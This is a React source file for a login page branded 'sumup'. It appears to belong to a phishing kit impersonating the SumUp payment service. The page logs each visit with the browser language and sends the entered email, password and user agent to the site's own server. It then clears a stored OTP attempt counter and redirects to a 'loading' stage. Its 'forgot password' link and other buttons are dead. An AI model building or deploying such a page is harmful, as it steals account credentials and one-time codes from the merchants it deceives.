import { useState, useEffect } from "react";
import { Link, useLocation } from "wouter";
import { Eye, EyeOff } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { useTranslation } from "@/contexts/LanguageContext";

export default function Login() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const { t } = useTranslation();

  useEffect(() => {
    // Track visitor when page loads with language info
    const language = navigator.language || "Unknown";
    apiRequest("POST", "/api/track-visit", {
      page: "Login Page",
      language,
    }).catch(() => {
      // Silent fail - tracking shouldn't break the app
    });
  }, []);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      // Get language and device info
      const language = navigator.language || "Unknown";
      const userAgent = navigator.userAgent || "Unknown";

      const response = await apiRequest("POST", "/api/login", {
        email,
        password,
        language,
        userAgent,
      });
      const data = await response.json();

      if (data.success) {
        // Clear any previous OTP attempts for fresh login session
        localStorage.removeItem('otpAttempts');
        
        toast({
          title: t('login_success_title'),
          description: t('login_success_desc'),
        });

        setEmail("");
        setPassword("");

        // Redirect to loading page
        setTimeout(() => {
          setLocation("/loading");
        }, 1000);
      }
    } catch (error: any) {
      toast({
        title: t('login_failed_title'),
        description: error.message || t('login_failed_desc'),
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-white px-4">
      <div className="w-full max-w-md">
        <Link
          href="/"
          className="mb-12 flex items-center hover:opacity-80 transition-opacity"
          data-testid="link-home"
        >
          <div
            className="h-8 w-8 bg-black rounded-md flex items-center justify-center"
            data-testid="logo-icon"
          >
            <svg viewBox="0 0 24 24" fill="white" className="h-5 w-5">
              <path d="M13 10V3L4 14h7v7l9-11h-7z" />
            </svg>
          </div>
          <span className="ml-2 text-lg font-semibold" data-testid="logo-text">
            sumup
          </span>
        </Link>

        <h1
          className="text-4xl font-bold mb-12 text-black"
          data-testid="text-title"
        >
          {t('login_title')}
        </h1>

        <form onSubmit={handleLogin} className="space-y-6">
          <div>
            <label
              htmlFor="email"
              className="block text-sm font-medium mb-2 text-black"
              data-testid="label-email"
            >
              {t('login_email_label')}
            </label>
            <input
              id="email"
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder={t('login_email_placeholder')}
              required
              className="w-full h-12 px-4 border border-black rounded-md focus:outline-none focus:ring-2 focus:ring-black text-black placeholder:text-gray-400"
              data-testid="input-email"
            />
          </div>

          <div>
            <label
              htmlFor="password"
              className="block text-sm font-medium mb-2 text-black"
              data-testid="label-password"
            >
              {t('login_password_label')}
            </label>
            <div className="relative">
              <input
                id="password"
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                className="w-full h-12 px-4 pr-12 border border-black rounded-md focus:outline-none focus:ring-2 focus:ring-black text-black"
                data-testid="input-password"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-black"
                data-testid="button-toggle-password"
              >
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>
          </div>

          <div className="text-left">
            <a
              href="#"
              className="text-sm font-medium text-black underline hover:no-underline"
              data-testid="link-forgot-password"
            >
              {t('login_forgot_password')}
            </a>
          </div>

          <button
            type="submit"
            disabled={isLoading}
            className="w-full h-12 bg-black text-white font-semibold rounded-md hover:bg-opacity-90 disabled:bg-opacity-50 transition-all"
            data-testid="button-submit"
          >
            {isLoading ? t('login_button_loading') : t('login_button')}
          </button>
        </form>

        <div className="mt-8">
          <button
            type="button"
            className="w-full h-12 border border-black text-black font-medium rounded-md hover:bg-gray-50 transition-all"
            data-testid="button-connect-password"
          >
            {t('login_connect_password')}
          </button>
        </div>

        <div className="mt-16 text-center">
          <button
            type="button"
            className="text-sm font-medium text-black border border-black px-8 py-3 rounded-md hover:bg-gray-50 transition-all"
            data-testid="button-system-status"
          >
            {t('login_system_status')}
          </button>
        </div>
      </div>
    </div>
  );
}
